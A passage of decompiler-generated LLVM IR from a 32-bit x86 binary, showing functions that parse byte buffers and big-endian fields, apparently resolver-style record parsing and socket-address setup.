  uselistorder i8 2, { 1, 2, 3, 4, 5, 15, 6, 0, 18, 19, 7, 8, 9, 10, 11, 16, 17, 12, 14, 13 }
  uselistorder i8 8, { 0, 7, 8, 3, 4, 5, 6, 2, 1 }
}

define i32 @function_8056d64() local_unnamed_addr {
dec_label_pc_8056d64:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056d64 = load i32, i32* @edi, align 4
  %v0_8056d65 = load i32, i32* @esi, align 4
  %v0_8056d66 = load i32, i32* @ebx, align 4
  store i32 %v0_8056d66, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8056d73 = load i32, i32* @eax, align 4
  %v1_8056d76 = inttoptr i32 %tmp to i32*
  %v2_8056d76 = load i32, i32* %v1_8056d76, align 4
  %v7_8056d78 = inttoptr i32 %v2_8056d76 to i8*
  %v8_8056d78 = call i32 @function_8057364(i8* %v7_8056d78, i32 %tmp2, i32 %tmp3, i32 %v0_8056d73, i32 %v0_8056d66, i32 %v0_8056d65, i32 %v0_8056d64)
  %v2_8056d80 = icmp slt i32 %v8_8056d78, 0
  store i32 %v8_8056d78, i32* @ecx, align 4
  br i1 %v2_8056d80, label %dec_label_pc_8056db1, label %dec_label_pc_8056d86

dec_label_pc_8056d86:                             ; preds = %dec_label_pc_8056d64
  %v0_8056d86 = load i32, i32* @ebx, align 4
  %v2_8056d86 = sub i32 %v0_8056d86, %v8_8056d78
  %v1_8056d88 = add i32 %v2_8056d86, -3
  %v6_8056d88 = sub i32 2, %v2_8056d86
  %v7_8056d88 = and i32 %v6_8056d88, %v2_8056d86
  %v8_8056d88 = icmp slt i32 %v7_8056d88, 0
  %v9_8056d88 = icmp eq i32 %v1_8056d88, 0
  %v10_8056d88 = icmp slt i32 %v1_8056d88, 0
  %v3_8056d8b = icmp eq i1 %v10_8056d88, %v8_8056d88
  %v4_8056d8b = icmp eq i1 %v9_8056d88, false
  %v5_8056d8b = and i1 %v4_8056d8b, %v3_8056d8b
  br i1 %v5_8056d8b, label %dec_label_pc_8056d92, label %dec_label_pc_8056d8d

dec_label_pc_8056d8d:                             ; preds = %dec_label_pc_8056d86
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8056db1

dec_label_pc_8056d92:                             ; preds = %dec_label_pc_8056d86
  %v0_8056d92 = load i32, i32* @edi, align 4
  %v2_8056d92 = add i32 %v0_8056d92, %v8_8056d78
  store i32 %v2_8056d92, i32* @edx, align 4
  %v0_8056d95 = load i32, i32* @esi, align 4
  %v1_8056d95 = add i32 %v0_8056d95, 5
  %v2_8056d95 = inttoptr i32 %v1_8056d95 to i8*
  %v3_8056d95 = load i8, i8* %v2_8056d95, align 1
  %v1_8056d99 = add i32 %v8_8056d78, 4
  store i32 %v1_8056d99, i32* @ecx, align 4
  %v3_8056d9c = inttoptr i32 %v2_8056d92 to i8*
  store i8 %v3_8056d95, i8* %v3_8056d9c, align 1
  %v0_8056d9e = load i32, i32* @esi, align 4
  %v1_8056d9e = add i32 %v0_8056d9e, 4
  %v2_8056d9e = inttoptr i32 %v1_8056d9e to i32*
  %v3_8056d9e = load i32, i32* %v2_8056d9e, align 4
  %v1_8056da1 = trunc i32 %v3_8056d9e to i8
  %v2_8056da1 = load i32, i32* @edx, align 4
  %v3_8056da1 = add i32 %v2_8056da1, 1
  %v4_8056da1 = inttoptr i32 %v3_8056da1 to i8*
  store i8 %v1_8056da1, i8* %v4_8056da1, align 1
  %v0_8056da4 = load i32, i32* @esi, align 4
  %v1_8056da4 = add i32 %v0_8056da4, 9
  %v2_8056da4 = inttoptr i32 %v1_8056da4 to i8*
  %v3_8056da4 = load i8, i8* %v2_8056da4, align 1
  %v2_8056da8 = load i32, i32* @edx, align 4
  %v3_8056da8 = add i32 %v2_8056da8, 2
  %v4_8056da8 = inttoptr i32 %v3_8056da8 to i8*
  store i8 %v3_8056da4, i8* %v4_8056da8, align 1
  %v0_8056dab = load i32, i32* @esi, align 4
  %v1_8056dab = add i32 %v0_8056dab, 8
  %v2_8056dab = inttoptr i32 %v1_8056dab to i32*
  %v3_8056dab = load i32, i32* %v2_8056dab, align 4
  %v1_8056dae = trunc i32 %v3_8056dab to i8
  %v2_8056dae = load i32, i32* @edx, align 4
  %v3_8056dae = add i32 %v2_8056dae, 3
  %v4_8056dae = inttoptr i32 %v3_8056dae to i8*
  store i8 %v1_8056dae, i8* %v4_8056dae, align 1
  %v0_8056db2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056db1

dec_label_pc_8056db1:                             ; preds = %dec_label_pc_8056d64, %dec_label_pc_8056d8d, %dec_label_pc_8056d92
  %v0_8056db2 = phi i32 [ %v8_8056d78, %dec_label_pc_8056d64 ], [ -1, %dec_label_pc_8056d8d ], [ %v0_8056db2.pre, %dec_label_pc_8056d92 ]
  %v2_8056db1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056db1, i32* @ebx, align 4
  store i32 %v0_8056d64, i32* @edi, align 4
  ret i32 %v0_8056db2

; uselistorder directives
  uselistorder i32 %v1_8056d88, { 1, 0 }
  uselistorder i32 %v2_8056d86, { 0, 2, 1 }
  uselistorder i32 %v8_8056d78, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 7, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_8056db1, { 2, 1, 0 }
}

define i32 @function_8056db8() local_unnamed_addr {
dec_label_pc_8056db8:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8056dc3 = call i32 @function_80574d0(i32 %tmp, i32 %tmp1)
  %v2_8056dc8 = icmp slt i32 %v2_8056dc3, 0
  %v1_8056dca = add i32 %v2_8056dc3, 4
  %v1_8056dcd = icmp eq i1 %v2_8056dc8, false
  %v4_8056dcd = select i1 %v1_8056dcd, i32 %v1_8056dca, i32 %v2_8056dc3
  ret i32 %v4_8056dcd

; uselistorder directives
  uselistorder i32 %v2_8056dc3, { 1, 0, 2 }
}

define i32 @function_8056dd4() local_unnamed_addr {
dec_label_pc_8056dd4:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056dd4 = load i32, i32* @ebp, align 4
  %v0_8056dd5 = load i32, i32* @edi, align 4
  %v0_8056dd6 = load i32, i32* @esi, align 4
  %v0_8056dd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8056dd7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8056df8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8056df8, i32* %eax.global-to-local, align 4
  %v4_8056e05 = call i32 @function_80573f4(i32 %tmp4, i32 %tmp7, i32 %v2_8056df8, i32 256)
  store i32 %v4_8056e05, i32* %eax.global-to-local, align 4
  %v3_8056e0d = icmp slt i32 %v4_8056e05, 0
  store i32 %v4_8056e05, i32* @edi, align 4
  br i1 %v3_8056e0d, label %dec_label_pc_8056ec0, label %dec_label_pc_8056e17

dec_label_pc_8056e17:                             ; preds = %dec_label_pc_8056dd4
  %v0_8056e17 = load i32, i32* @ebx, align 4
  %v3_8056e17 = add i32 %v0_8056e17, %v4_8056e05
  %v0_8056e19 = load i32, i32* @esi, align 4
  %v2_8056e19 = sub i32 %v0_8056e19, %v3_8056e17
  %v1_8056e1b = add i32 %v2_8056e19, -10
  %v10_8056e1b = icmp slt i32 %v1_8056e1b, 0
  store i32 %v1_8056e1b, i32* @esi, align 4
  %v1_8056e26 = icmp eq i1 %v10_8056e1b, false
  br i1 %v1_8056e26, label %dec_label_pc_8056e2f, label %dec_label_pc_8056e28

dec_label_pc_8056e28:                             ; preds = %dec_label_pc_8056e17
  br label %dec_label_pc_8056ec0

dec_label_pc_8056e2f:                             ; preds = %dec_label_pc_8056e17
  %v6_8056e36 = add i32 %v3_8056e17, %tmp4
  store i32 %v6_8056e36, i32* @ebx, align 4
  store i32 %v2_8056df8, i32* %eax.global-to-local, align 4
  %v1_8056e42 = call i32 @function_805669c(i32 %v2_8056df8)
  store i32 %v1_8056e42, i32* %eax.global-to-local, align 4
  %v0_8056e47 = load i32, i32* @ebx, align 4
  %v1_8056e47 = add i32 %v0_8056e47, 4
  store i32 %v1_8056e47, i32* %esi.global-to-local, align 4
  %v1_8056e4a = load i32, i32* @ebp, align 4
  %v2_8056e4a = inttoptr i32 %v1_8056e4a to i32*
  store i32 %v1_8056e42, i32* %v2_8056e4a, align 4
  %v0_8056e4d = load i32, i32* @ebx, align 4
  %v1_8056e4d = inttoptr i32 %v0_8056e4d to i8*
  %v2_8056e4d = load i8, i8* %v1_8056e4d, align 1
  %v3_8056e4d = zext i8 %v2_8056e4d to i32
  store i32 %v3_8056e4d, i32* %eax.global-to-local, align 4
  %v1_8056e50 = add i32 %v0_8056e4d, 1
  %v2_8056e50 = inttoptr i32 %v1_8056e50 to i8*
  %v3_8056e50 = load i8, i8* %v2_8056e50, align 1
  %v4_8056e50 = zext i8 %v3_8056e50 to i32
  store i32 %v4_8056e50, i32* %edx.global-to-local, align 4
  %v2_8056e54 = mul nuw nsw i32 %v3_8056e4d, 256
  %v2_8056e57 = or i32 %v4_8056e50, %v2_8056e54
  store i32 %v2_8056e57, i32* %eax.global-to-local, align 4
  %v1_8056e59 = load i32, i32* @ebp, align 4
  %v2_8056e59 = add i32 %v1_8056e59, 4
  %v3_8056e59 = inttoptr i32 %v2_8056e59 to i32*
  store i32 %v2_8056e57, i32* %v3_8056e59, align 4
  %v0_8056e5c = load i32, i32* @ebx, align 4
  %v1_8056e5c = add i32 %v0_8056e5c, 2
  %v2_8056e5c = inttoptr i32 %v1_8056e5c to i8*
  %v3_8056e5c = load i8, i8* %v2_8056e5c, align 1
  %v4_8056e5c = zext i8 %v3_8056e5c to i32
  store i32 %v4_8056e5c, i32* %eax.global-to-local, align 4
  %v1_8056e60 = add i32 %v0_8056e5c, 3
  %v2_8056e60 = inttoptr i32 %v1_8056e60 to i8*
  %v3_8056e60 = load i8, i8* %v2_8056e60, align 1
  %v4_8056e60 = zext i8 %v3_8056e60 to i32
  store i32 %v4_8056e60, i32* %edx.global-to-local, align 4
  %v2_8056e64 = mul nuw nsw i32 %v4_8056e5c, 256
  %v2_8056e67 = or i32 %v4_8056e60, %v2_8056e64
  store i32 %v2_8056e67, i32* %eax.global-to-local, align 4
  %v1_8056e69 = load i32, i32* @ebp, align 4
  %v2_8056e69 = add i32 %v1_8056e69, 8
  %v3_8056e69 = inttoptr i32 %v2_8056e69 to i32*
  store i32 %v2_8056e67, i32* %v3_8056e69, align 4
  %v0_8056e6c = load i32, i32* @ebx, align 4
  %v1_8056e6c = add i32 %v0_8056e6c, 4
  %v2_8056e6c = inttoptr i32 %v1_8056e6c to i8*
  %v3_8056e6c = load i8, i8* %v2_8056e6c, align 1
  %v4_8056e6c = zext i8 %v3_8056e6c to i32
  store i32 %v4_8056e6c, i32* %edx.global-to-local, align 4
  %v0_8056e70 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056e70 = add i32 %v0_8056e70, 1
  %v2_8056e70 = inttoptr i32 %v1_8056e70 to i8*
  %v3_8056e70 = load i8, i8* %v2_8056e70, align 1
  %v4_8056e70 = zext i8 %v3_8056e70 to i32
  store i32 %v4_8056e70, i32* %eax.global-to-local, align 4
  %v1_8056e74 = add i32 %v0_8056e70, 2
  %v2_8056e74 = inttoptr i32 %v1_8056e74 to i8*
  %v3_8056e74 = load i8, i8* %v2_8056e74, align 1
  %v4_8056e74 = zext i8 %v3_8056e74 to i32
  %v2_8056e78 = mul nuw i32 %v4_8056e6c, 16777216
  %v2_8056e7b = mul nuw nsw i32 %v4_8056e70, 65536
  store i32 %v2_8056e7b, i32* %eax.global-to-local, align 4
  %v2_8056e7e = or i32 %v2_8056e7b, %v2_8056e78
  store i32 %v2_8056e7e, i32* %edx.global-to-local, align 4
  %v1_8056e80 = add i32 %v0_8056e70, 3
  %v2_8056e80 = inttoptr i32 %v1_8056e80 to i8*
  %v3_8056e80 = load i8, i8* %v2_8056e80, align 1
  %v4_8056e80 = zext i8 %v3_8056e80 to i32
  store i32 %v4_8056e80, i32* %eax.global-to-local, align 4
  %v2_8056e84 = mul nuw nsw i32 %v4_8056e74, 256
  %v2_8056e87 = or i32 %v4_8056e80, %v2_8056e7e
  store i32 %v2_8056e87, i32* %edx.global-to-local, align 4
  %v2_8056e89 = or i32 %v2_8056e87, %v2_8056e84
  store i32 %v2_8056e89, i32* @ecx, align 4
  %v1_8056e8b = load i32, i32* @ebp, align 4
  %v2_8056e8b = add i32 %v1_8056e8b, 12
  %v3_8056e8b = inttoptr i32 %v2_8056e8b to i32*
  store i32 %v2_8056e89, i32* %v3_8056e8b, align 4
  %v0_8056e8e = load i32, i32* @ebx, align 4
  %v1_8056e8e = add i32 %v0_8056e8e, 8
  %v2_8056e8e = inttoptr i32 %v1_8056e8e to i8*
  %v3_8056e8e = load i8, i8* %v2_8056e8e, align 1
  %v4_8056e8e = zext i8 %v3_8056e8e to i32
  store i32 %v4_8056e8e, i32* %edx.global-to-local, align 4
  %v1_8056e92 = add i32 %v0_8056e8e, 9
  %v2_8056e92 = inttoptr i32 %v1_8056e92 to i8*
  %v3_8056e92 = load i8, i8* %v2_8056e92, align 1
  %v4_8056e92 = zext i8 %v3_8056e92 to i32
  store i32 %v4_8056e92, i32* %eax.global-to-local, align 4
  %v1_8056e96 = add i32 %v0_8056e8e, 10
  %v1_8056e99 = load i32, i32* @ebp, align 4
  %v2_8056e99 = add i32 %v1_8056e99, 20
  %v3_8056e99 = inttoptr i32 %v2_8056e99 to i32*
  store i32 %v1_8056e96, i32* %v3_8056e99, align 4
  %v0_8056e9c = load i32, i32* %edx.global-to-local, align 4
  %v2_8056e9c = mul i32 %v0_8056e9c, 256
  %v1_8056e9f = load i32, i32* %eax.global-to-local, align 4
  %v2_8056e9f = or i32 %v1_8056e9f, %v2_8056e9c
  store i32 %v2_8056e9f, i32* @edx, align 4
  %v1_8056ea1 = load i32, i32* @ebp, align 4
  %v2_8056ea1 = add i32 %v1_8056ea1, 16
  %v3_8056ea1 = inttoptr i32 %v2_8056ea1 to i32*
  store i32 %v2_8056e9f, i32* %v3_8056ea1, align 4
  %v1_8056eab = add i32 %v3_8056e17, 10
  store i32 %v1_8056eab, i32* %eax.global-to-local, align 4
  %v1_8056eae = load i32, i32* @ebp, align 4
  %v2_8056eae = add i32 %v1_8056eae, 24
  %v3_8056eae = inttoptr i32 %v2_8056eae to i32*
  store i32 %v1_8056eab, i32* %v3_8056eae, align 4
  %v4_8056eb1 = load i32, i32* @edx, align 4
  %v5_8056eb5 = icmp slt i32 %v1_8056e1b, %v4_8056eb1
  br i1 %v5_8056eb5, label %dec_label_pc_8056eb7, label %dec_label_pc_8056ebc

dec_label_pc_8056eb7:                             ; preds = %dec_label_pc_8056e2f
  br label %dec_label_pc_8056ec0

dec_label_pc_8056ebc:                             ; preds = %dec_label_pc_8056e2f
  %v1_8056ebc = load i32, i32* @edi, align 4
  %v2_8056ebc = add i32 %v4_8056eb1, 10
  %v3_8056ebc = add i32 %v2_8056ebc, %v1_8056ebc
  br label %dec_label_pc_8056ec0

dec_label_pc_8056ec0:                             ; preds = %dec_label_pc_8056dd4, %dec_label_pc_8056eb7, %dec_label_pc_8056e28, %dec_label_pc_8056ebc
  %v0_8056ec6 = phi i32 [ %v4_8056e05, %dec_label_pc_8056dd4 ], [ -1, %dec_label_pc_8056eb7 ], [ %v1_8056e1b, %dec_label_pc_8056e28 ], [ %v3_8056ebc, %dec_label_pc_8056ebc ]
  store i32 %v0_8056ec6, i32* %eax.global-to-local, align 4
  %v2_8056ec8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056ec8, i32* @ebx, align 4
  store i32 %v0_8056dd6, i32* @esi, align 4
  store i32 %v0_8056dd5, i32* @edi, align 4
  store i32 %v0_8056dd4, i32* @ebp, align 4
  ret i32 %v0_8056ec6

; uselistorder directives
  uselistorder i32 %v0_8056ec6, { 1, 0 }
  uselistorder i32 %v2_8056e7b, { 1, 0 }
  uselistorder i32 %v1_8056e1b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8056e17, { 1, 0, 2 }
  uselistorder i32 %v4_8056e05, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8056df8, { 1, 2, 0, 3 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12 }
  uselistorder i32 3, { 43, 44, 45, 46, 47, 48, 21, 0, 12, 1, 22, 2, 17, 42, 3, 49, 23, 5, 4, 6, 10, 11, 9, 24, 13, 25, 38, 20, 39, 28, 29, 30, 31, 32, 33, 50, 18, 19, 34, 26, 15, 16, 7, 40, 41, 8, 27, 35, 36, 37, 14 }
  uselistorder i32 (i32)* @function_805669c, { 2, 1, 0 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056ec0, { 3, 1, 2, 0 }
}

define i32 @function_8056ed0() local_unnamed_addr {
dec_label_pc_8056ed0:
  %v3_8056edd = call i32 @function_8055e78(i32 ptrtoint ([11 x i8]* @global_var_805d445.419 to i32), i32 ptrtoint (i32* @global_var_805d410.404 to i32))
  store i32 %v3_8056edd, i32* @eax, align 4
  %v1_8056ee5 = icmp eq i32 %v3_8056edd, 0
  %v1_8056ee7 = icmp eq i1 %v1_8056ee5, false
  br i1 %v1_8056ee7, label %dec_label_pc_8056efd, label %dec_label_pc_8056ee9

dec_label_pc_8056ee9:                             ; preds = %dec_label_pc_8056ed0
  %v3_8056ef5 = call i32 @function_8055e78(i32 ptrtoint ([18 x i8]* @global_var_805d450.420 to i32), i32 ptrtoint (i32* @global_var_805d410.404 to i32))
  br label %dec_label_pc_8056efd

dec_label_pc_8056efd:                             ; preds = %dec_label_pc_8056ed0, %dec_label_pc_8056ee9
  %v0_8056f00 = phi i32 [ %v3_8056edd, %dec_label_pc_8056ed0 ], [ %v3_8056ef5, %dec_label_pc_8056ee9 ]
  ret i32 %v0_8056f00

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_8055e78, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805d410.404 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8056efd, { 1, 0 }
}

define i32 @function_8056f01(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_8056f01:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8056f01 = load i32, i32* @ebp, align 4
  %v0_8056f02 = load i32, i32* @edi, align 4
  %v0_8056f03 = load i32, i32* @esi, align 4
  %v0_8056f04 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8056f12 = sub i32 0, %arg6
  %v1_8056f14 = urem i32 %v1_8056f12, 4
  %v2_8056f14 = icmp eq i32 %v1_8056f14, 0
  store i32 %v1_8056f14, i32* %eax.global-to-local, align 4
  br i1 %v2_8056f14, label %dec_label_pc_8056f25, label %dec_label_pc_8056f19

dec_label_pc_8056f19:                             ; preds = %dec_label_pc_8056f01
  %v2_8056f19 = sub i32 %arg7, %v1_8056f14
  %v7_8056f19 = icmp ugt i32 %v1_8056f14, %arg7
  br i1 %v7_8056f19, label %dec_label_pc_80571c9, label %dec_label_pc_8056f21

dec_label_pc_8056f21:                             ; preds = %dec_label_pc_8056f19
  %v2_8056f21 = add i32 %v1_8056f14, %arg6
  store i32 %v2_8056f21, i32* @ebx, align 4
  store i32 %v2_8056f19, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056f25

dec_label_pc_8056f25:                             ; preds = %dec_label_pc_8056f01, %dec_label_pc_8056f21
  %v0_8056f33 = phi i32 [ %arg6, %dec_label_pc_8056f01 ], [ %v2_8056f21, %dec_label_pc_8056f21 ]
  %v0_8056f3a = phi i32 [ %arg7, %dec_label_pc_8056f01 ], [ %v2_8056f19, %dec_label_pc_8056f21 ]
  %tmp = icmp ult i32 %v0_8056f3a, 32
  br i1 %tmp, label %dec_label_pc_80571c9, label %dec_label_pc_8056f2e

dec_label_pc_8056f2e:                             ; preds = %dec_label_pc_8056f25
  %v12_8056f2e = icmp eq i32 %arg4, 1
  %v1_8056f33 = add i32 %v0_8056f33, 32
  store i32 %v1_8056f33, i32* %eax.global-to-local, align 4
  %v1_8056f3a = add i32 %v0_8056f3a, -32
  store i32 %v1_8056f3a, i32* @ebp, align 4
  br i1 %v12_8056f2e, label %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge, label %dec_label_pc_8056f43

dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge: ; preds = %dec_label_pc_8056f2e
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8057079

dec_label_pc_8056f43:                             ; preds = %dec_label_pc_8056f2e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8056f4a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8056f4a, align 4
  %tmp143 = icmp ult i32 %v1_8056f3a, 4
  br i1 %tmp143, label %dec_label_pc_80571c9, label %dec_label_pc_8056f56

dec_label_pc_8056f56:                             ; preds = %dec_label_pc_8056f43
  %v0_8056f56 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056f56 = add i32 %v0_8056f56, -36
  store i32 %v1_8056f56, i32* %eax.global-to-local, align 4
  %tmp144 = icmp ult i32 %v1_8056f56, 8
  br i1 %tmp144, label %dec_label_pc_80571c9, label %dec_label_pc_8056f62

dec_label_pc_8056f62:                             ; preds = %dec_label_pc_8056f56
  %v0_8056f62 = load i32, i32* @ebp, align 4
  %tmp145 = icmp ult i32 %v0_8056f62, 16
  br i1 %tmp145, label %dec_label_pc_80571c9, label %dec_label_pc_8056f6b

dec_label_pc_8056f6b:                             ; preds = %dec_label_pc_8056f62
  %v1_8056f6b = add i32 %v0_8056f56, -48
  store i32 %v1_8056f6b, i32* %eax.global-to-local, align 4
  %tmp146 = icmp ult i32 %v1_8056f6b, 8
  br i1 %tmp146, label %dec_label_pc_80571c9, label %dec_label_pc_8056f77

dec_label_pc_8056f77:                             ; preds = %dec_label_pc_8056f6b
  %v0_8056f77 = load i32, i32* @ebx, align 4
  %v1_8056f77 = add i32 %v0_8056f77, 48
  %v1_8056f7a = add i32 %v0_8056f56, -44
  store i32 %v1_8056f7a, i32* @ebp, align 4
  %v1_8056f81 = add i32 %v0_8056f56, -56
  store i32 %v1_8056f81, i32* @eax, align 4
  %v7_8056f84 = icmp ult i32 %v1_8056f81, %v1_8056f7a
  %v1_8056f86 = add i32 %v0_8056f77, 36
  store i32 %v1_8056f86, i32* @edi, align 4
  br i1 %v7_8056f84, label %dec_label_pc_8056f90, label %dec_label_pc_8056f8b

dec_label_pc_8056f8b:                             ; preds = %dec_label_pc_8056f77
  %v1_8056f8b = add i32 %v0_8056f77, 44
  store i32 %v1_8056f8b, i32* @esi, align 4
  br label %dec_label_pc_8056f95

dec_label_pc_8056f90:                             ; preds = %dec_label_pc_8056f77
  %v1_8056f90 = add i32 %v0_8056f77, 56
  store i32 %v1_8056f90, i32* @esi, align 4
  store i32 %v1_8056f81, i32* @ebp, align 4
  br label %dec_label_pc_8056f95

dec_label_pc_8056f95:                             ; preds = %dec_label_pc_8056f8b, %dec_label_pc_8056f90
  %v0_8056f95 = phi i32 [ %v1_8056f7a, %dec_label_pc_8056f8b ], [ %v1_8056f81, %dec_label_pc_8056f90 ]
  %tmp147 = icmp ult i32 %v0_8056f95, 80
  br i1 %tmp147, label %dec_label_pc_80571c9, label %dec_label_pc_8056f9e

dec_label_pc_8056f9e:                             ; preds = %dec_label_pc_8056f95
  %v0_8056f9e = call i32 @function_8056ed0()
  store i32 %v0_8056f9e, i32* %eax.global-to-local, align 4
  %v1_8056fa3 = icmp eq i32 %v0_8056f9e, 0
  br i1 %v1_8056fa3, label %dec_label_pc_8056fcb, label %dec_label_pc_8056fab

dec_label_pc_8056fab:                             ; preds = %dec_label_pc_8056f9e
  store i32 %v1_8056f33, i32* %edx.global-to-local, align 4
  store i32 %v1_8056f77, i32* %eax.global-to-local, align 4
  %v0_8056fb3 = load i32, i32* @edi, align 4
  %v0_8056fb7 = load i32, i32* @esi, align 4
  %v4_8056fbb = inttoptr i32 %v1_8056f33 to i8*
  br label %dec_label_pc_8057079

dec_label_pc_8056fcb:                             ; preds = %dec_label_pc_8056f9e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8056fcf = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8056fcf, align 4
  %v1_8056fd5 = call i32 @function_8050f90(i32 0)
  store i32 %v1_8056fd5, i32* %eax.global-to-local, align 4
  %v1_8056fda = inttoptr i32 %v1_8056fd5 to i32*
  %v2_8056fda = load i32, i32* %v1_8056fda, align 4
  store i32 %v2_8056fda, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80571c9

dec_label_pc_8056fe5:                             ; preds = %dec_label_pc_805714c
  %v2_8056fe5 = load i8*, i8** %stack_var_-44, align 4
  %v3_8056fe5 = ptrtoint i8* %v2_8056fe5 to i32
  store i32 %v3_8056fe5, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8056fec = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8056fe5, i32* %v2_8056fec, align 4
  %v0_8056fee = load i32, i32* %eax.global-to-local, align 4
  %v1_8056fee = add i32 %v0_8056fee, 4
  %v2_8056fee = inttoptr i32 %v1_8056fee to i32*
  store i32 0, i32* %v2_8056fee, align 4
  %v0_8056ff5 = load i32, i32* @ebx, align 4
  %v1_8056ff5 = add i32 %v0_8056ff5, 4
  %v2_8056ff5 = inttoptr i32 %v1_8056ff5 to i32*
  %v3_8056ff5 = load i32, i32* %v2_8056ff5, align 4
  store i32 %v3_8056ff5, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8056ff5, i32* %arg5, align 4
  %v1_8056ffe = add i32 %tmp60, 8
  %v2_8056ffe = inttoptr i32 %v1_8056ffe to i32*
  store i32 2, i32* %v2_8056ffe, align 4
  %v0_8057005 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057005 = add i32 %v0_8057005, 12
  %v2_8057005 = inttoptr i32 %v1_8057005 to i32*
  store i32 4, i32* %v2_8057005, align 4
  br label %dec_label_pc_805703e

dec_label_pc_8057012:                             ; preds = %dec_label_pc_805716e
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_805701a = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805701a, align 4
  %v0_805701c = load i32, i32* %edx.global-to-local, align 4
  %v1_805701c = add i32 %v0_805701c, 4
  %v2_805701c = inttoptr i32 %v1_805701c to i32*
  store i32 0, i32* %v2_805701c, align 4
  %v0_8057023 = load i32, i32* @ebx, align 4
  %v1_8057023 = add i32 %v0_8057023, 4
  %v2_8057023 = inttoptr i32 %v1_8057023 to i32*
  %v3_8057023 = load i32, i32* %v2_8057023, align 4
  store i32 %v3_8057023, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8057023, i32* %arg5, align 4
  %v1_805702c = add i32 %tmp60, 8
  %v2_805702c = inttoptr i32 %v1_805702c to i32*
  store i32 10, i32* %v2_805702c, align 4
  %v0_8057033 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057033 = add i32 %v0_8057033, 12
  %v2_8057033 = inttoptr i32 %v1_8057033 to i32*
  store i32 16, i32* %v2_8057033, align 4
  br label %dec_label_pc_805703e

dec_label_pc_805703e:                             ; preds = %dec_label_pc_8056fe5, %dec_label_pc_8057012
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8056fe5 ], [ %storemerge3, %dec_label_pc_8057012 ]
  %v1_805703e = load i32, i32* %edx.global-to-local, align 4
  %v2_805703e = add i32 %v1_805703e, 16
  %v3_805703e = inttoptr i32 %v2_805703e to i32*
  store i32 %storemerge, i32* %v3_805703e, align 4
  %v0_8057041 = load i32, i32* @ebx, align 4
  %v1_8057041 = add i32 %v0_8057041, 8
  %v1_8057044 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057044 = add i32 %v1_8057044, 4
  %v3_8057044 = inttoptr i32 %v2_8057044 to i32*
  store i32 %v1_8057041, i32* %v3_8057044, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_805704b = load i32, i32* %edx.global-to-local, align 4
  %v2_805704b = inttoptr i32 %arg8 to i32*
  store i32 %v0_805704b, i32* %v2_805704b, align 4
  br label %dec_label_pc_80571a9

dec_label_pc_8057079:                             ; preds = %dec_label_pc_8056f2e.dec_label_pc_8057079_crit_edge, %dec_label_pc_8056fab
